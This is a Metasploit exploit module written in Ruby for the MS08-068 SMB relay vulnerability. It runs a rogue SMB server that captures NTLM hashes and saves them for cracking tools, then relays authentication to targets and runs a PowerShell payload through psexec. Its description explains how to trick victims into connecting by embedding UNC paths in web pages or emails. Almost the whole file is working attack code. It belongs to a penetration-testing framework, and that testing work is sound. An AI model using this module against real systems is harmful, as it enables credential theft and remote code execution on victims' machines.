##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

=begin
Windows XP systems that are not part of a domain default to treating all
network logons as if they were Guest. This prevents SMB relay attacks from
gaining administrative access to these systems. This setting can be found
under:

  Local Security Settings >
   Local Policies >
    Security Options >
     Network Access: Sharing and security model for local accounts
=end

require 'ruby_smb'
require 'ruby_smb/gss/provider/ntlm'
require 'metasploit/framework/hashes/identify'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include ::Msf::Exploit::SMBHashCapture
  include ::Msf::Exploit::Remote::SMB::Client::Psexec
  include ::Msf::Exploit::Powershell

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'MS08-068 Microsoft Windows SMB Relay Code Execution',
        'Description' => %q{
          This module will relay SMB authentication requests to another
          host, gaining access to an authenticated SMB session if successful.
          If the connecting user is an administrator and network logins are
          allowed to the target machine, this module will execute an arbitrary
          payload. To exploit this, the target system	must try to	authenticate
          to this module. The easiest way to force a SMB authentication attempt
          is by embedding a UNC path (\SERVER\SHARE) into a web page or
          email message. When the victim views the web page or email, their
          system will automatically connect to the server specified in the UNC
          share (the IP address of the system running this module) and attempt
          to authenticate.  Unfortunately, this
          module is not able to clean up after itself. The service and payload
          file listed in the output will need to be manually removed after access
          has been gained. The service created by this tool uses a randomly chosen
          name and description, so the services list can become cluttered after
          repeated exploitation.

          The SMB authentication relay attack was first reported by Sir Dystic on
          March 31st, 2001 at @lanta.con in Atlanta, Georgia.

          On November 11th 2008 Microsoft released bulletin MS08-068. This bulletin
          includes a patch which prevents the relaying of challenge keys back to
          the host which issued them, preventing this exploit from working in
          the default configuration. It is still possible to set the SMBHOST
          parameter to a third-party host that the victim is authorized to access,
          but the "reflection" attack has been effectively broken.
        },
        'Author' => [
          'hdm', # All the work
          'juan vazquez' # Add NTLMSSP support to the exploit
        ],
        'License' => MSF_LICENSE,
        'Privileged' => true,
        'DefaultOptions' => {
          'EXITFUNC' => 'thread'
        },
        'Payload' => {
          'Space' => 2048,
          'DisableNops' => true,
          'StackAdjustment' => -3500
        },
        'References' => [
          ['CVE', '2008-4037'],
          ['OSVDB', '49736'],
          ['MSB', 'MS08-068'],
          ['URL', 'http://blogs.technet.com/swi/archive/2008/11/11/smb-credential-reflection.aspx'],
          ['URL', 'https://en.wikipedia.org/wiki/SMBRelay'],
          ['URL', 'http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx']
        ],
        'Arch' => [ARCH_X86, ARCH_X64],
        'Platform' => 'win',
        'Targets' => [
          ['Automatic', {}],
        ],
        'DisclosureDate' => '2001-03-31',
        'DefaultTarget' => 0,
        'Actions' => [['Capture', { 'Description' => 'Run SMB MITM server' }]],
        'PassiveActions' => ['Capture'],
        'DefaultAction' => 'Capture'
        # 'Stance' => Msf::Exploit::Stance::Passive,
        # 'Passive' => true
      )
    )

    register_options(
      [
        # TODO: See if RHosts should be used, for scheme suppport (i.e. HTTP targets) - and renaming this to RELAY_TARGETS?
        OptAddressRange.new('SMBHOST', [true, 'Target address range or CIDR identifier to relay to']),
        OptAddressLocal.new('SRVHOST', [true, 'The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.']),
        OptPort.new('SRVPORT', [true, 'The local port to listen on.', 445]),
        OptString.new('CAINPWFILE', [false, 'Name of file to store Cain&Abel hashes in. Only supports NTLMv1 hashes. Can be a path.', nil]),
        OptString.new('JOHNPWFILE', [false, 'Name of file to store JohnTheRipper hashes in. Supports NTLMv1 and NTLMv2 hashes, each of which is stored in separate files. Can also be a path.', nil]),
        OptString.new('SMBDomain', [true, 'The domain name used during SMB exchange.', 'WORKGROUP'], aliases: ['DOMAIN_NAME']),
        # TODO: Add a CLIENT_TIMEOUT / RELAY_TIMEOUT?
        OptInt.new('TIMEOUT', [true, 'Seconds that the server socket will wait for a response after the client has initiated communication.', 5])
      ]
    )

    deregister_options('RPORT', 'RHOSTS', 'SMBPass', 'SMBUser')
  end

  def exploit
    @rsock = Rex::Socket::Tcp.create(
      'LocalHost' => datastore['SRVHOST'],
      'LocalPort' => datastore['SRVPORT'],
      'Server' => true,
      'Timeout' => datastore['TIMEOUT'],
      'Context' =>
        {
          'Msf' => framework,
          'MsfExploit' => self
        }
    )

    ntlm_provider = Msf::Exploit::Remote::SMB::Mitm::AlwaysGrantAccessGssProvider.new(
      default_domain: datastore['SMBDomain']
    )

    # Set domain name for all future server responses
    ntlm_provider.dns_domain = datastore['SMBDomain']
    ntlm_provider.dns_hostname = datastore['SMBDomain']
    ntlm_provider.netbios_domain = datastore['SMBDomain']
    ntlm_provider.netbios_hostname = datastore['SMBDomain']

    validate_smb_hash_capture_datastore(datastore, ntlm_provider)

    # TODO: Confirm if this needs local_host, rather than ntlm_provider
    # TODO: Confirm if this needs to be tracked appropriately as a framework service or such
    server = Msf::Exploit::Remote::SMB::Mitm::MITMServer.new(
      server_sock: @rsock,
      gss_provider: ntlm_provider,
      logger: :stdout,
      relay_targets: datastore['SMBHOST'],
      listener: self,
      # TODO: Confirm if there is a timeout required for RubySMB's server, i.e. client timeout versus relay timeout
      relay_timeout: datastore['TIMEOUT']
    )

    print_status("Server is running. Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}")
    server.run do
      print_line
      print_good 'Received SMB connection on Auth Capture Server!'
      true
    end
  end

  def on_ntlm_type3(address:, challenge:, client_os_version:, ntlm_message:)
    report_ntlm_type3(
      address: address,
      challenge: challenge,
      client_os_version: client_os_version,
      ntlm_message: ntlm_message
    )
  end

  def on_relay_success(conn)
    # The psexec mixins assume a single smb client instance is available, which makes it impossible
    # to use when there are multiple SMB requests occuring in parallel. Let's create a replicant module,
    # and set the datastore options and simple smb instance
    new_mod_instance = replicant
    new_mod_instance.datastore['RHOST'] = conn.target.ip
    new_mod_instance.datastore['RPORT'] = conn.target.port
    # Wrap the ruby_smb connection in a rex-compatible adapter
    new_mod_instance.simple = ::Rex::Proto::SMB::SimpleClient.new(conn.dispatcher.tcp_socket, client: conn)

    # TODO: Track created threads so they can be killed correctly, and ensure there are no dataraces
    framework.threads.spawn("smb_relay_#{conn.target.ip}:#{conn.target.port}", false, new_mod_instance) do |mod_instance|
      vprint_status 'Running psexec'

      # TODO: Align this with the psexec module
      mod_instance.execute_powershell_payload
    end
  end

  def on_relay_failure(_conn)
    # noop
  end

  def cleanup
    # TODO: MAKE MORE SPECIFIC

    begin
      @rsock.close if @rsock
    rescue StandardError => e
      elog('Failed closing SMB server socket', error: e)
    end

    super
  end
end
